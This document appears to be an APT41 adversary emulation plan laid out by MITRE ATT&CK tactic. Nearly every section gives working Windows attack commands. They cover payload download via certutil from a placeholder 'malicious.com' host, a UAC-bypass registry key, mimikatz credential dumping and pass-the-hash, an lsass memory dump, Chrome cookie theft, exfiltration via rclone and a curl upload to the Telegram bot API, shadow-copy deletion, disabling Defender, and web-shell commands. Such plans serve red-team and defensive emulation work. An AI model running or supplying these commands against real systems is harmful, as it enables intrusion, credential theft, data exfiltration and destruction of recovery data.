
## APT41 Emulation Plan

### Initial Access (TA0001)
**T1190 - Exploit Public-Facing Applications**
- Exploited vulnerabilities in:
  - Apache Tomcat Manager
  - JBoss JMX Console
  - Zimbra
- Deployed web shells (ANTSWORD, BLUEBEAM) via RCE exploits
- Leveraged ProxyShell (CVE-2021-34473) for Exchange server access

**T1078 - Valid Accounts**
- Used stolen credentials from:
  - Google Workspace
  - Office365
  - VPN accounts
- Pivoted from cloud accounts to internal networks

---

### Execution (TA0002)
**T1059.003 - Windows Command Shell**
```
certutil -urlcache -split -f http://malicious.com/payload.exe C:\temp\payload.exe
rundll32.exe C:\Windows\Temp\malicious.dll,Start

```

```
  

# Privilege Escalation (TA0004)

  

## T1548.002 - Bypass UAC

```
```

reg add HKCU\Software\Classes\ms-settings\shell\open\command /v DelegateExecute /t REG_SZ /d "C:\backdoor.exe"

```

  

## T1055 - Process Injection

```

mimikatz.exe "privilege::debug" "inject::process explorer.exe /payload.bin"

```

  

# Defense Evasion (TA0005)

  

## T1027 - Obfuscation

- AES-256/ChaCha20 encrypted payloads

- Gzip-compressed shellcodes

  

## T1202 - Indirect Command Execution

```

wmic process call create "powershell -exec bypass -File C:\payload.ps1"

```

  

# Credential Access (TA0006)

  

## T1555 - Credentials from Stores

```

vaultcmd.exe /listcreds:"Windows Credentials"

procdump.exe -accepteula -ma lsass.exe lsass.dmp

```

  

## T1003 - OS Credential Dumping

```

sekurlsa::logonPasswords

```

  

# Discovery (TA0007)

  

## T1018 - Remote System Discovery

```

net view /domain

arp -a

systeminfo

```

  

## T1082 - System Info Discovery

```

wmic computersystem get Model,Manufacturer

```

  

# Lateral Movement (TA0008)

  

## T1021 - Remote Services

```

wmic /node:<target_ip> process call create "powershell -exec bypass -File C:\payload.ps1"

```

  

## T1550.002 - Pass the Hash

```

sekurlsa::pth /user:Administrator /domain:target.local /ntlm:<hash>

```

  

# Collection (TA0009)

  

## T1005 - Local System Data

```

copy C:\Users\Administrator\AppData\Local\Google\Chrome\User Data\Default\Cookies C:\stolen_data

```

  

# Command and Control (TA0011)

  

## T1071 - Application Layer Protocol

- Cobalt Strike with HTTPS/DNS tunneling

- RC4-encrypted payloads

  

## T1095 - Non-Application Protocol

- Custom TCP backdoors

  

# Exfiltration (TA0010)

  

## T1041 - C2 Channel Exfiltration

```

rclone sync C:\stolen_data onedrive:backup --transfers=5 --progress

```

  

## T1567 - Web Service Exfiltration

```

curl -X POST -F "file=@C:\stolen_data.zip" https://api.telegram.org/bot<TOKEN>/sendDocument?chat_id=<ID>

```

  

# Impact (TA0040)

  

## T1490 - Inhibit System Recovery

```

vssadmin delete shadows /all /quiet

```

  

## T1489 - Service Stop

```
sc stop WinDefend

```

  

# Additional Tools & Techniques

  

## Web Shells

  

### ANTSWORD


```

whoami

ipconfig /all

net user

powershell -enc <Base64Command>

```

  

### BLUEBEAM

```

GET /admin.php?cmd=whoami

POST /shell.php HTTP/1.1

```

  

## DLL Trojanization

```

%windir%\Microsoft.NET\assembly\GAC_MSIL\System.Data.Trace\v4.0_4.0.0.0__b0<hex_uuid>\<module_name>.dll

```
